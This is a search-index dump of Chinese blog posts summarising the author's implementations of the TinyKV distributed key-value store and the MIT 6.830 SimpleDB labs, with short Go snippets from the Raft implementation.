[{"categories":null,"content":"TinyKV是教学项目，算是PingCAP TiKV的go语言简化版，实现了一个带有调度器的基于multi-raft的分布式K/V存储。 项目源地址：https://github.com/tidb-incubator/tinykv 我的实现：https://github.com/waruto210/tinykv ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:0:0","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Project1 StandaloneKV 基于PingCAP修改的badger实现一个单机的支持column family的K/V存储。这个非常简单，唯一让我觉得不舒服的就是，文档和注释并没有提示应该某些情况是否应该抛出error，比如KeyNotFound，要查看测试才知道。 基于badger实现StandAloneStorage，要求实现如下的Storage接口，这个接口也是后面真正的分布式RaftStorage要实现的接口。另外还有一个MemStorage实现了该接口，用于测试。 type Storage interface { Start() error Stop() error Write(ctx *kvrpcpb.Context, batch []Modify) error Reader(ctx *kvrpcpb.Context) (StorageReader, error) } type StorageReader interface { // When the key doesn't exist, return nil for the value GetCF(cf string, key []byte) ([]byte, error) IterCF(cf string) engine_util.DBIterator Close() } ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:1:0","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Project2 RaftKV 这部分要求实现一个单个region的raft kv。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:2:0","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part A 在最内部的Raft结构中，使用RaftLog来管理日志。它维护着各种index： snapshot/first.....applied....committed....stabled.....last 所有未压缩的log entries都会被放在内存中的entries数组（日志压缩后，应该更新），从first开始；stable表示已经被持久化到storage中的日志，last表示当前最新日志。 新建Raft时，注意从config.storage回复之前的信息；选举时，要注意处理一些corner case，例如只有一个节点。 当节点成为Leader后，应该先Append一个no-op entry，并广播给其他节点，因为新Leader虽然一定具有最新的日志，但commit index不一定是最新的，而且Raft不允许Leader直接commit不属于自己任期的日志，这样可以尽快更快地更新Leader的commit index到最新。在PingCAP的TiKV 功能介绍 - Lease Read中也提到了这个问题，etcd和TiKV刚开始都没注意到这个Bug。 然后要实现RawNode的两个关键方法:HasReady()和Advance()。前者返回一个Ready结构体，记录了Raft实例的状态，需要被持久化的日志，需要被apply的日志，需要被apply的snapshot，需要发送到其他Raft实例的消息；后者在前者返回的Ready被处理后，需要更新Raft实例的相关状态。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:2:1","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part B 这一部分是驱动Raft KV的核心。 主要步骤为： 对TinyKV的操作被发送给Raft Leader所在节点； Leader节点的peerMsgHandler.proposeRaftCommand记录proposal，并将操作转化为Raft log，驱动Raft达成共识； peerMsgHandler.HandleRaftReady：每个节点通过RawNode获取Ready，将需要被持久化的信息持久化，将需要被发送的消息发送出去，然后调用Advance，更新Raft实例的状态。 Leader节点还需要处理当初留下的proposal，通过callback回复客户端。 对于读操作，可以直接将其转化为一个Log，等到HandleRaftReady时回复客户端，这延迟会很高；也可以采用Raft论文 section8的优化措施，PingCAP的TiKV 功能介绍 - Lease Read中也做了说明。另外，apply log也可以异步执行，提升效率。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:2:2","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part C 参照PingCAP的TiKV 源码解析系列文章（十）Snapshot 的发送和接收。 在 Raft 中，Snapshot 指的是整个 State Machine 数据的一份快照，大体上有以下这几种情况需要用到 Snapshot： 正常情况下 leader 与 follower 之间是通过 append log 的方式进行同步的，出于空间和效率的考虑，leader 会定期清理过老的 log。假如 follower/learner 出现宕机或者网络隔离，恢复以后可能所缺的 log 已经在 leader 节点被清理掉了，此时只能通过 Snapshot 的方式进行同步。 Raft 加入新的节点的，由于新节点没同步过任何日志，只能通过接收 Snapshot 的方式来同步。实际上这也可以认为是 1 的一种特殊情形。 出于备份/恢复等需求，应用层需要 dump 一份 State Machine 的完整数据。 实际上主要是情况1和2。 Snapshot不是作为普通的RaftMessage发送的，因为其Size太大。 Raftstore 想要gc时，propose一个AdminCmdType_CompactLog，等到commit后，处理ready时，修改RaftTruncatedState，然后进行实际的gc删除日志。后续Raft Leader向follower发送日志时，如果找不到next指针对应的log，那么该log由于compaction已经被丢弃了，所以只能发送snapshot。Leader调用Storage.Snapshot()生成snapshot，就绪后，Leader发出snapshot message，follower 收到snapshot message后，follower调用handleSnapshot处理，在RaftLog中记录pendingSnapshot，等handleRaftReady时，根据snapshot message的内信息，新建task去apply snapshot。snapshot具体的传输及apply细节TinyKV框架已经实现好了，要了解的话，可以查看👆的文章。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:2:3","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Project3 MultiRaftKV 这一点，要实现多region多Raft Group的机制。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:3:0","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part A 实现3A的leader transfer和conf change非常简单，我觉得这里安排不合理，把太多内容安排到3B了，3A的测试也不足，导致很多坑在3B才被发现。 Raft实例使用PendingConfIndex来记录最新的conf change entry的index，如果有更新的conf change entry，应该修改为最新的，因为可能有Leader propose新的conf change之后，没有来得及复制到大多数节点，Leader崩溃，重新选举的Leader没有该日志，此时客户端可能会propose新的conf change。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:3:1","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part B leader transfer和conf change 这部分要实现对AdminCmdType_TransferLeader和AdminCmdType_ChangePeer的处理。 当Raft.leadTransferee不为None时，为了使leader transfer尽快成功，应该拒绝propose新的command。 对于conf change，有一些坑。 首先，新建peer的Raft实例，其Raft.Prs是空的，要等到apply snapshot后，才能获取到当前Group的peers信息，这种情况下，r.Prs[r.id]不存在，而另一种情况，r由于conf change被删除，r.Prs[r.id]也不存在，如果直接返回，依靠判断r.Prs[r.id]来决定是否要处理message，是不行的。所以，作如下的判断，让新peer能够正常接收message。 func (r *Raft) Step(m pb.Message) error { // Your Code Here (2A). // if r have been removed due to conf change // or new added node has no Prs but should step if _, ok := r.Prs[r.Id]; !ok \u0026\u0026 len(r.Prs) != 0 { log.Infof(\"%d do not exist and have other peers return, term %d, Prs %+v\\n\", r.Id, r.Term, r.Prs) return nil } switch r.State { case StateFollower: r.stepFollower(m) case StateCandidate: r.stepCandidate(m) case StateLeader: r.stepLeader(m) } return nil } 此外，考虑到新节点没有数据，为了避免不必要的超时选举（而且由于Prs为空，所以选举会直接成功，造成脑裂），当节点的term为0时，不进行tick；收到Leader的心跳后，立即将自己和Leader加入到r.Prs中。 解决完以上问题后，跑测试出现超时的概率还是比较大，通过打log发现以下问题：执行完Raft.addNode后，Leader向新peer发送snapshot，但是有时会出现Leader先发送完snapshot后，新的peer才创建完成，开始接受消息，导致这个snapshot就消失了。在我的实现中，Leader发送snapshot后，直接设置自己的r.Prs[to].Next = snapshot.Metadata.Index + 1，因为不这样做，很可能在新peer的response回来之前，又因为触发sendAppend向其发送snapshot，而生成snapshot是极其费时的；但是在前面的问题下，由于snapshot丢了，那么Leader发送后续日志时，新peer会拒绝，Leader将Next -= 1，然后继续，直到Next小于Leader日志的first index，如此来回，耗费了大量时间，自然就超时了。所以，最后在我的实现中，follower会将response message的m.Index设置为自己的last index，leader发现其小于自己的first index的话，就立即发送snapshot，解决snapshot丢失的问题。 此外，conf change有一个特殊case。考虑：当前Raft group有两个节点Leader A、Follower B，conf change要remove A，那么会出现以下问题，A把conf change的log成功复制给B之后，A apply conf change，把自己删除，没来得及把新的commit index发送给B；此时B的commit index不够新，无法apply这条con change，然后B超时，开启选举，此时B的Prs中还有A，B永远无法选举成功。这种问题有一个解决办法，就是remove自己时，计算quorum不要把自己算进去。但是TinyKV的框架不方便实现这个，底层Raft并不知道是remove还是add，更不知道remove谁，要实现的话，需要更改一些代码。所以我选择，在这种情况下，直接return，不予接受。 if req.ChangePeer.ChangeType == eraftpb.ConfChangeType_RemoveNode \u0026\u0026 d.IsLeader() \u0026\u0026 len(d.Region().Peers) == 2 \u0026\u0026 req.ChangePeer.Peer.Id == d.PeerId() { //log.Infof(\"%s return corner case\\n\", d.Tag) err := fmt.Sprintf(\"%s return corner case\\n\", d.Tag) cb.Done(ErrResp(errors.New(err))) return } split region in raftstore 这里要实现region分裂，实现了这个，就真的实现了multi-raft K/V store了。流程比较简单，按照文档给出的流程就好了。 不过在测试中遇到了no region问题，在asktug上，发现这个问题挺普遍的。这是因为：向PD请求region信息时，找不到对应的region信息。 region分裂一般的实现是 [A, B) -\u003e [A, C) + [C, B)，现有region分配为[A, C)，新region分配为[C, B)。旧region是正常的，Leader在持续给PD发送心跳，PD能够及时更新region信息，而新region还需要等待多个peer创建完成，超时，然后选出Leader，发送心跳给PD。因为，向PD查新region信息时，有一段时间查不到[C, B)的信息。 我的解决方案是：首先，对于Term为5的节点（region分裂，新建的正常节点Term是5），立即开始选举，为了防止多个节点同时开始选举，导致多次选举失败，可以仅让Id为偶数的节点开始选举；此外，由于测试中，请求的key在增大，所以为了可以让旧region负责[C, B)，新region负责[A, C)，这样能够split完成后，能够立即响应新的请求，不过这种改进感觉只算是为了通过测试的tricky。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:3:2","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part C 这部分是实现一个小型的PD，实现收集心跳与集群平衡，比较简单，按照文档实现即可。 不过，文档中少了一个限制条件，在测试中体现了，被迁移的region，其分布的store数量要满足集群的MaxReplicas。这应该是为了防止迁移region导致集群不可用，做的优化。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:3:3","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Project 4: Transactions TinyKV采用的Percolator算法，提供了snapshot隔离性，客户端从数据库读到的数据就像从它开始执行事务时数据库被frozen了一样（客户端观察到数据库一个一致的view）。 Percolator算法源自Large-scale Incremental Processing Using Distributed Transactions and Notifications，可以参考PingCAP这篇文章Deep Dive TiKV - Percolator。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:4:0","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part A 这部分就是实现对MVCC基础结构的封装，比较简单，但是代码可能写起来有点烦。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:4:1","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part B 这部分实现Percolator事务最关键的三个操作，读，Pewwrite，和commit。 KvGet： 时间戳ts 查找是否有[0, ts]的锁，如果有，那么我们不能确定该事务是否在ts前被commit（已经commit，锁还没释放完），返回，稍后重试；如果没有，可以读 从write CF读取[0, ts]范围内最新的write记录，从中获取对应事务的start_ts 根据start_ts然后读取default CF KvPrewrite 时间戳start_ts 对每个key，加一个lock，然后以start_ts把数据写入default CF，选择一个lock为primary lock，每个lock都包括start_ts；如果key上已经有lock，回滚事务 Kv Commit 时间戳commit_ts 移除primary lock，同时在write CF写入一个带有start_ts的记录；如果primary lock没有了（超时，被其他事务移除了），事务失败 移除所有secondary lock 只要primary lock被移除，事务就算成功。 有一个比较关键的地方，原Percolator系统基于BigTable，它是支持单行事务的，lock，write，data只不过是单行的一个列；而TinyKV这里，是3个CF，虽然我们可以原子性的写入3个CF，但是考虑：如果两个事务同时检查Key是否加锁，然后发现没有锁，在同时写入锁，这中间并不会有任何阻碍。所以，框架提供了Latch，注释写道: Only one thread can hold a latch at a time and all keys that a command might write must be locked // at once. ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:4:2","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part B 这部分比较简单，实现四个操作，主要是用于检查事务状态，决定回滚还是提交。 KvScan：用于按 Key 顺序扫描，类似KvGet一样实现即可； KvCheckTxnStatus：用于检查事务锁的状态； KvBatchRollback：用于批量回滚数据； KvResolveLock：使用KvCheckTxnStatus检查锁的状态后，再使用KvResolveLock回滚或者提交。 ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:4:3","tags":null,"title":"TinyKV实现总结","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"简介 在lab4中，我们实现的事务是基于NO STEAL/FORCE的，no steal会影响BufferPool的可用空间，甚至如果事务的write set太大了，BufferPool太大了，事务会根本无法执行；Force会导致I/O的开销特别大，并且commit前写多个page时可能会crash，无法保证原子性。所以要做基于WAL的Rollback和Recovery。 Recovery算法包含两部分： 为了确保DBMS能够从failure中恢复，在事务的正常执行过程中需要做的事； 在事务执行中，写入WAL。仅当事务对应的log都被持久化之后，才能提交事务；当事务abort后，可以利用WAL log回滚。定期向持久化存储写入checkpoint，记录当前活跃的transactions和dirty pages。 WAL包含redo和undo信息： redo log必须是physical的，如对DB内某数据结构的修改，因为crash时，DBMS可能不满足“action consistent”，一些操作可能包含一系列非原子操作，例如插入一条数据，index中插入了，但是HeapFile中还没有。 undo log必须时logical的，如delete/insert一条DB中的Tuple，因为当我们undo时，状态可能和写入该log时不一致了。如下图，undo T2时，如果把Page N直接恢复到WB之前的状态，那T1的修改就丢失了。 当DBMS crash后，需要做一些操作来恢复数据库的状态，保证ACD（隔离是2PL/MVCC的事了）。 从最近checkpoint开始分析，得出需要redo和undo的事务列表 redo undo SimpleDB提供的日志代码产生的日志记录用于进行physical的全页undo和redo。当一个page第一次被读入时，代码会记录该页面的原始内容，作为一个before-image。当一个事务更新过一个page后，对应的日志record，会将记录的修改前的page内容作为before-image，将修改后的当前page内容作为after-image。之后，可以使用before-image在abort时回滚，或者在Recovery期间撤销loser transactions；使用after-image在Recovery期间redo winner transactions。 之所以可以通过整个页面的physical UNDO来完成abort和恢复，是因为SimpleDB使用页级锁并且没有那种可能在undo时与日志被写入时结构不一致的索引。页级锁的简化作用是：如果一个事务修改了一个Page，它一定有该Page的独占锁，这意味着没有其他事务在同时修改它，所以我们可以通过覆盖整个页面来UNDO对它的修改，也就是下图中，T2 commit前，T1没有机会写Page N，physical undo不会覆盖其他事务的修改。 SimpleDB日志的格式如下图所示： ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab6-rollback-and-recovery/:1:0","tags":null,"title":"MIT 6.830 Lab6 Rollback and Recovery","uri":"/posts/mit-6.830-lab6-rollback-and-recovery/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab6-rollback-and-recovery/:2:0","tags":null,"title":"MIT 6.830 Lab6 Rollback and Recovery","uri":"/posts/mit-6.830-lab6-rollback-and-recovery/"},{"categories":null,"content":"1. Rollback SimpleDB提供了数据结构tidToFirstLogRecord来保存每个事务在logfile里的offset。我们只需要从开始处一直读，保存每个page的before image，然后将所有before image写回disk，即可完成rollback。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab6-rollback-and-recovery/:2:1","tags":null,"title":"MIT 6.830 Lab6 Rollback and Recovery","uri":"/posts/mit-6.830-lab6-rollback-and-recovery/"},{"categories":null,"content":"2. Recovery 如果数据库crash并且重启，那么会在开始执行事务之前，先调用LogFile.recover()进行恢复。 如果有，读取最新的checkpoint； 从checkpoint向后扫描，找出loser transaction（checkpoint中记录的active tx，但后续未commit的；checkpoint后开始的新tx，但未commit的），redo checkpoint后更新记录。因为调用LogFile.logCheckpoint()会把所有dirty page写入disk，所以可以安全的从ckeckpoint开始redo； undo loser transactions； SimpleDB中，abort的事务不要redo，也不要undo。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab6-rollback-and-recovery/:2:2","tags":null,"title":"MIT 6.830 Lab6 Rollback and Recovery","uri":"/posts/mit-6.830-lab6-rollback-and-recovery/"},{"categories":null,"content":"简介 实现前4个lab后，SimpleDB已经是一个支持事务和CRUD的简单数据库了，但是性能太低了随便一个点查询或者范围查询，都要扫描整个table对应的DbFile。本lab需要实现一个B+Tree索引，用于快速查找和range scan。SimpleDB提供了实现树所需的所有low-level代码，我们需要自己实现使用树搜索，分裂page，在page间重新分配tuples，合并page的方法。 B+Tree树的叶节点，可以直接包含Tuple，也可以包含Tuple的RecordId，为了简化，本实验的叶节点，直接存储Tuple。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:1:0","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:0","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"1. Search BTreeFile包含四种不同的page： 首先是BTreeInternalPage和BTreeLeafPage，BTreePage接口包含了对这两种page的抽象；BTreeHeaderPage用于追踪哪些page正在被使用；BTreeRootPtrPage存在于每个BTreeFile的头部，指向RootPage和第一个HeaderPage。 首先我们需要实现对B+Tree的搜索，对于给定的key，返回其所在的LeafPage；如下图，给key1，应该返回左侧page。 需要注意的是，如果给出key6，也应该返回左侧page，否则沿着page查找时，会丢掉左侧这个tuple。 在本实验中，读取page都要使用BTreeFile.getPage()，其内部也是调用BufferPool.getPage()，但是添加了更多对dirty page的追踪。HeapFile执行insertTuple/deleteTuple时，只会返回一个dirty page，但是B+Tree由于涉及到节点的split/merge，可能会有很多dirty page。 在findLeafPage()中，获取的Internal Page都应该是READ_ONLY权限，Leaf Page应该是参数给定的权限。这是B+Tree访问加锁的策略。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:1","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"2. Insert 插入需要首先使用findLeafPage()找到对应的Leaf Page，然后可能涉及到Leaf Page的split，split后需要向parent page插入一个新的key，这又可能涉及到parent的split，直到Root Page。 SimpleDB十分喂饭，提供的getParentWithEmptySlots()帮我们处理了这个递归过程，我们只需要实现splitLeafPage()和splitInternalPage()。 如下图所示，split leaf page，是将一个page从中间一分为二，将右侧page第一个key ”copy“到parent中。 split internal page是将page中间的key “push”到parent中，然后将其两边的key一分为二。 注意B+Tree需要时刻保持以下特性： 如果parent指向child，那么child必须指回同一个parent； 如果一个leaf指向一个right sibling，那么right sibling必须将它作为left sibling； 第一个和最后一个Leaf，对应sibling必须指向null； RecordId必须与page匹配； child为non-leaf节点的key，必须比left child的key大，比right child的key小； child为leaf节点的key，必须大于等于left child的key，小于等于right child的key； 一个节点的child，要么都是non-leaf，要么都是leaf。 如果测试中出现了错误，可以使用SimpleDB提供的BTreeChecker，检查是否满足上述特性。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:2","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"3. Delete 删除Tuple可以使用RecordId直接给对应的Leaf Page加锁，然后删除；删除后如果Leaf Page的Tuple数量少于半满，可能会有两种情况。 如果sibling多于半满，那么可以从sibling steal一定数量的tuple，使得两者平均，steal后，还需要修改parent entry中的key。 如果sibling也少于等于半满，那么需要和sibling merge，并且删除parent中的entry，而对parent中的entry进行删除，则可能会触发parent的递归steal或者merge。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:3","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"4. Transactions 如果想要允许多线程同时访问B+Tree，要防止以下两种问题： 多个thread同时修改一个node的内容； 一个thread正在traversing tree，其他线程在merge/split node。 SimpleDB中的加锁策略很简单： 对于scan，从root page到leaf page，加读锁； 对于insert，从root page开始的所有internal page都加读锁，Leaf page加写锁，如果涉及到split，就对sibling和parent加写锁，并且继续递归向上加写锁； 对于delete，直接对leaf page加写锁，如果涉及到steal/merge，再对sibling和parent加写锁，并且继续递归向上加写锁处理。 CMU 15-445中讲解了一些更好的加锁方法： 如果前面对于lab4 transaction和B+Tree的实现都正确，那么我们的B+Tree应该是自动满足事务的。BTreeTest是整个SimpleDB最难的测试，并发量比较大，对事务和B+Tree的问题基本都能测试出来。如果测试出了错误，可以使用BTreeChecker来检查B+Tree在并发时有无格式错误；可以先将测试用例的并发度降到能复现错误的最低值，然后输出执行过程过的加锁、commit、abort、split/merge page等信息，一点一点模拟，花个一两天总能debug出来。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:4","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"简介 完成前三个lab，SimpleDB已经具有基本的CRUD的能力，但是还缺少事务。本lab需要实现一个简单的基于锁的事务管理系统。需要在代码适当的位置添加lock/unlock，并且track事务所持有的锁并在事务需要锁时授予它。 本lab使用严格两阶段锁（2PL）协议。在2PL协议下，每个transaction都会经过两个阶段：在第一个阶段里，transaction根据需求不断地获取锁，叫做 growing phase (expanding phase)；在第二个阶段里，transaction开始释放其持有的锁，根据2PL的规则，这个transaction不能再获得新的锁，它所持有的锁逐渐减少，叫做 shrinking phase (contracting phase)。而strict-2PL，则要求transaction在执行结束（commit/abort）时统一释放所有锁。这样避免了一个transaction abort后，其他transaction级联abort。例如： tx A：lock page1，2，3 tx A: unlock 3 tx B: lock 3 // 基于tx A的更改执行事务 tx A: abort tx B: abort // cascading abort ACID保证 Atomicity：Strict 2PL和细致的buffer管理保证原子性。 Consistency：由于原子性的存在，数据库事务是一致的。SimpleDB不解决其他一致性问题（如key相关的一致性）。 Isolation：Strict 2PL保证隔离性。 Durability：强制的buffer管理机制保证持久性。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:1:0","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"Recovery and Buffer Management 为了简化工作，建议实现一个NO STEAL/FORCE buffer management policy。 STEAL：是否允许未提交的transaction覆盖持久化存储中对象的最新提交值（对应SimpleDB，即是否允许在事务未commit时，将其相关的dirty page写入disk）。 FORCE：允许事务提交前，是否要求其作出的修改都反映到持久化存储上（对应SimpleDB，即在事务commit前，是否要强制将其对应的所有dirty page写到disk）。 为了进一步简化工作，假设SimpleDB在执行transactionComplete操作时，不会crash。 上述三点意味着本lab不需要实现log-based recovery，因为不需要undo（不淘汰dirty page，即未提交的更改不会写入disk）；也不需要redo（commit时强制写出page到disk并且commit过程中不会crash）。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:1:1","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:0","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"1. Granting Locks 在SimpleDB（例如BufferPool）中添加代码，允许调用者代表特定事务获取或者释放对象上的锁（shared/exclusive）。 实验建议在page的粒度上锁，SimpleDB的文档和单元都测试假定实现了page粒度的锁。 需要创建一些数据结构，跟踪每个事务持有哪些锁并在事务获取锁时进行检查，决定是否授予。 实现读写锁： 事务读之前，必须上shared lock。 事务写之前，必须上exclusive lock。 多个事务可以对同一个page上shared lock。 只能有一个事务对page上exclusive lock。 如果t是唯一持有page p上的shared lock的事务，那么可以升级为exclusive lock。 如果一个事务对锁的请求不能立即满足，应该阻塞，等到lock可用。一定要注意race condition。 我的实现包含一个PageLockManager类，所有锁的信息记录在一个HashMap\u003cPageId, HashMap\u003cTransactionId, PageLockType\u003e\u003e中，使用java内置的synchronized对其acquire/release方法进行同步。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:1","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"2. Lock Lifetime 实现上述的strict-2PL。在之前的设计中，读取任何page都使用了BufferPool.getPage()，保证了growing phase。 为了保证strict shrinking phase，应该在事务commit/abort时一次性释放所有的锁。如果我们通过遍历bufferpool中当前的page，并判断是否加锁，然后释放的话，逻辑上是有bug的，因为被加锁的page有可能在执行过程中被evict了，所以要在PageLockManager中添加一个方法，用于释放指定事务上所有的锁。 此外，在执行过程中，2PL有一个例外。那就是对HeapFile插入时，查找有空slot的page，如果一个page上没有空slot，那么此时可以释放该page上的锁，然后继续查找其他page。这是因为插入时我们仅仅是查看该page有没有空slot而已，并没有其上任何信息 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:2","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"3. Implementing NO STEAL No Steal策略保证了dirty page不会被evict，就保证了事务提交前，修改不会落盘，不需对disk文件回滚。只需要简单修改evictPage方法，不淘汰dirty page就好了，如果全是dirty page，就抛异常。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:3","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"4. Transactions 在SimpleDB中，每个query开始时，创建一个TransactionId对象。这个对象被传递到所有在query中被调用的operator中。当query完成后，再调用BufferPool的transactionComplete方法。 在comit时，应当把BufferPool中跟事务相关的dirty page都flush；当事务终止，应该将与事务相关的dirty page都从disk读回，将BufferPool中的page变成事务执行前的状态。 这里逻辑很简单，但关于事务abort，我进了个坑，lab4的测试压力太小，没测出来，挂在lab5的BTreeTest上，查了两天的bug。 如果事务是在insertTuple/deleteTuple执行完之后再abort，那么由于no steal，abort时该事务的dirty page一定在BufferPool中被标记为dirty了，通过遍历BufferPool中的page，并将dirty page读回是可行的；但如果在执行过程中就abort了，那么BufferPool中被事务获取的page还没有标记dirty，我们需要通过PageLockManager来查看哪些page被加了exclusive锁，并把这些page从disk读回。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:4","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"5. Deadlocks and Aborts SimpleDB中的事务可能死锁，需要检测并且抛出TransactionAbortedException。 检测死锁的方式有很多种。最基本的例子是实现一个简单的超时策略，如果一个事务在给定的时间内还没有拿到需要的锁，就abort。而更实际的解决方案，可以基于等待图，定期检查依赖图中的环，或者当事务t acquire一个新的锁时，如果产生一个环，就中止某事务。如果终止t所等待的事务，可能会导致级联abort，但t能取得进展；如果终止t，那么其他事务可以正常运行。使用基于等待图的方案，需要修改PageLockManager的实现，所以我就实现了简单的超时策略。事务会不停地尝试获取一个锁，如果超时就abort。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:5","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"简介 在lab2中，实现了SimpleDB中的operator，对operator进行组合，就可以执行查询了，涉及查询，就应当进行查询优化了。lab3中，要实现一个cost-based optimizer。 cost-based optimizer的主要设计如下： 使用表的统计信息来评估不同query plan的cost。通常，query plan的cost与intermediate join/selection的基数以及filter/join predicates的selectivity（此处理解为满足predicates的tuple所占比例）有关。 使用这些信息将以最优的方式将selection和join排序，并选择最优的算法去实现join。 optimizer的架构如下： Parser初始化时，构造一个table统计信息的集合（statsMap）。然后等待query输入，并对输入的query调用parseQuery。 parseQuery首先构造出LogicalPlan，然后parseQuery调用LogicalPlan对象上的physicalPlan方法。physicalPlan方法返回一个DBIterator对象，用于实际执行query。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab3-query-optimization/:1:0","tags":null,"title":"MIT 6.830 Lab3 Query Optimization","uri":"/posts/mit-6.830-lab3-query-optimization/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab3-query-optimization/:2:0","tags":null,"title":"MIT 6.830 Lab3 Query Optimization","uri":"/posts/mit-6.830-lab3-query-optimization/"},{"categories":null,"content":"1. Statistics Estimation 准确估计cost是非常tricky的。在本lab中，只关心一系列join以及表访问的cost，无需关系access method的选择（现在也只有scan HeapFile一种）和其他operator的开销（如aggregates）。 1.1 Overall Plan Cost p=t1 join t2 join ... tn 表示一个left deep join，且t1是left-most的，其cost表示为： scancost(t1) + scancost(t2) + joincost(t1 join t2) + scancost(t3) + joincost((t1 join t2) join t3) + ... scancost是I/O开销，joincost是cpu开销，为了两者可以比较 cost(predicate application) = 1 cost(pageScan) = SCALING_FACTOR x cost(predicate application) 本lab忽略缓存的作用（即认为每次访问table的cost都是一次完整scan的cost）。 1.2 Join Cost nested-loop join的cost如下： joincost(t1 join t2) = scancost(t1) + ntups(t1) x scancost(t2) //IO cost + ntups(t1) x ntups(t2) //CPU cost 1.3 Filter Selectivity 需要评估一个table中满足predicate的tuple数量，本lab中采用基于直方图的方案： 对每个Field，计算出其最小最大值（scan一次）； 对每个属性构造直方图，可以使用固定个数的bucket； 再次扫描，填充直方图； 对一个f=const的查询，其属于的bucket，宽度为w，高度为h（tuple个数），table总tuple数为ntups，那么selectivity是*(h / w) / 